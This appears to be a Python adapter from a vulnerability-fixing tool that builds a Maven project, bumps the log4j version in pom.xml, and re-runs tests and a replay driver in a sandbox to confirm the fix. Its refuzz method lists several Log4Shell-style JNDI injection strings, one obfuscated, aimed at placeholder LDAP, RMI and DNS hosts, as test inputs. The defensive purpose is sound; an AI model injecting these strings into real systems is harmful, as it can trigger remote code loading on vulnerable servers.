"""Java / Maven adapter — turns a Maven project into a gate Target.

This is the Layer-1 adapter for the Java vertical slice. It drives a real Maven build and the
project's real JUnit suite, and runs single inputs through a replay driver that reports a JNDI
lookup in Jazzer's own output format (so `JazzerOracle` parses it unchanged). Everything the gate
needs is here; the gate itself stays language-agnostic.

The fix lane for this target is a dependency bump: `dependency_bump_patch` produces a real unified
diff against `pom.xml`. That is the honest, cheapest fix for the most common real vulnerability —
an outdated dependency — and the project's own tests prove the bump changed nothing else.
"""

from __future__ import annotations

import difflib
import os
import re
import shutil
import tempfile
from pathlib import Path

from ..gate.target import BuildResult, RunResult, TestResult, _discard
from ..sandbox import run_untrusted

_PROP = "log4j.version"


def dependency_bump_patch(pom_text: str, new_version: str, prop: str = _PROP) -> str:
    """A unified diff that bumps a `<prop>…</prop>` version property in pom.xml."""
    old_line = re.search(rf"[ \t]*<{prop}>([^<]+)</{prop}>\n", pom_text)
    if not old_line:
        raise ValueError(f"property <{prop}> not found in pom.xml")
    before = pom_text
    after = pom_text[: old_line.start()] + re.sub(
        rf"(<{prop}>)[^<]+(</{prop}>)", rf"\g<1>{new_version}\g<2>", old_line.group(0)
    ) + pom_text[old_line.end():]
    diff = difflib.unified_diff(
        before.splitlines(keepends=True), after.splitlines(keepends=True),
        fromfile="a/pom.xml", tofile="b/pom.xml",
    )
    return "".join(diff)


class MavenReplayTarget:
    """A gate Target backed by a Maven project and the ReplayDriver.

    Each build is a fresh copy of the source so the patch is applied cleanly and builds never
    contaminate each other. Maven runs offline (`-o`); dependencies are expected in the local
    repo (warm them once before the gate runs). The driver's main class and the project's own
    test command are the only project-specific knobs.
    """

    def __init__(
        self,
        source_root: str | Path,
        *,
        driver_class: str = "com.example.fuzz.ReplayDriver",
        timeout: float = 420.0,
        offline: bool = True,
    ) -> None:
        self.source_root = Path(source_root).resolve()
        self.driver_class = driver_class
        self.timeout = timeout
        self._o = "-o" if offline else ""

    # -- helpers ---------------------------------------------------------------------------
    def _sh(self, cmd: str, cwd: Path, *, timeout: float | None = None, stdin: bytes | None = None) -> RunResult:
        """Maven builds, tests and the replay driver are target code: through the sandbox door."""
        code, out, err, timed_out = run_untrusted(cmd, str(cwd), stdin=stdin,
                                                  timeout=timeout or self.timeout, env=dict(os.environ))
        return RunResult(code, out, err, timed_out=timed_out)

    def discard(self, build: BuildResult) -> None:
        _discard(build)

    def _cp(self, root: Path) -> str:
        return f"target/classes:target/test-classes:{(root / 'cp.txt').read_text().strip()}"

    # -- Target protocol -------------------------------------------------------------------
    def build(self, patch_diff: str | None, *, flavour: str = "sanitizer") -> BuildResult:
        label = "patched" if patch_diff else "vulnerable"
        root = Path(tempfile.mkdtemp(prefix=f"raksha-java-{label}-"))
        shutil.copytree(self.source_root, root, dirs_exist_ok=True)
        if patch_diff:
            (root / ".raksha.patch").write_text(patch_diff)
            applied = self._sh("git apply -p1 .raksha.patch", root)
            if applied.exit_code != 0:
                return BuildResult(False, label, "patch did not apply:\n" + applied.text, root)
        compiled = self._sh(f"mvn -q -B {self._o} test-compile", root)
        if compiled.exit_code != 0:
            return BuildResult(False, label, compiled.text[-800:], root)
        cp = self._sh(
            f"mvn -q -B {self._o} dependency:build-classpath "
            "-Dmdep.outputFile=cp.txt -Dmdep.includeScope=test", root)
        if cp.exit_code != 0 or not (root / "cp.txt").exists():
            return BuildResult(False, label, "classpath resolution failed:\n" + cp.text[-600:], root)
        return BuildResult(True, label, "ok", root)

    def run(self, build: BuildResult, data: bytes) -> RunResult:
        assert build.root is not None
        inp = build.root / ".raksha_input"
        inp.write_bytes(data)
        return self._sh(f'java -cp "{self._cp(build.root)}" {self.driver_class} .raksha_input',
                        build.root, timeout=120)

    def run_tests(self, build: BuildResult) -> TestResult:
        assert build.root is not None
        r = self._sh(f"mvn -B {self._o} test", build.root)
        ran = fail = 0
        for m in re.finditer(r"Tests run: (\d+).*?Failures: (\d+), Errors: (\d+)", r.text):
            ran += int(m.group(1)); fail += int(m.group(2)) + int(m.group(3))
        if ran == 0:  # surefire summary not found; fall back to exit status
            return TestResult(ran=1, failed=0 if r.exit_code == 0 else 1, log=r.text[-600:])
        return TestResult(ran=ran, failed=fail, log=r.text[-600:])

    def run_added_test(self, build: BuildResult, test_source: str) -> TestResult:
        # The slice's model-written test is expressed as a driver assertion rather than a JUnit
        # file, to avoid a second compile. Not used by the headline demo; kept for parity.
        return TestResult(0, 0, "added-test compilation not wired for the Java slice")

    def covered_lines(self, build: BuildResult, inputs: list[bytes]) -> set[tuple[str, int]]:
        assert build.root is not None
        covered: set[tuple[str, int]] = set()
        for data in inputs:
            inp = build.root / ".raksha_cov_input"
            inp.write_bytes(data)
            r = self._sh(f'java -cp "{self._cp(build.root)}" {self.driver_class} .raksha_cov_input --coverage',
                         build.root, timeout=120)
            for line in r.stdout.decode("utf-8", "replace").splitlines():
                if ":" in line:
                    f, _, n = line.rpartition(":")
                    if n.strip().isdigit():
                        covered.add((f.strip(), int(n)))
        return covered

    def refuzz(self, build: BuildResult, seconds: float) -> list[str]:
        """A bounded fresh campaign: a handful of JNDI-shaped variants the demo did not use.

        On the vulnerable build these fire; on a patched build (real fix) they do not — which is
        exactly what CLEAN_REFUZZ needs. An overfitting patch that special-cased one reproducer
        would be caught here.
        """
        variants = [
            b"u|${jndi:ldap://a.test/x}",
            b"u|${jndi:rmi://b.test/y}",
            b"u|prefix ${jndi:ldap://c.test/z} suffix",
            b"u|${jndi:dns://d.test/q}",
            b"u|${${lower:j}ndi:ldap://e.test/w}",
        ]
        out: list[str] = []
        for data in variants:
            r = self.run(build, data)
            if r.exit_code != 0 or "Java Exception" in r.text:
                out.append(r.text)
        return out
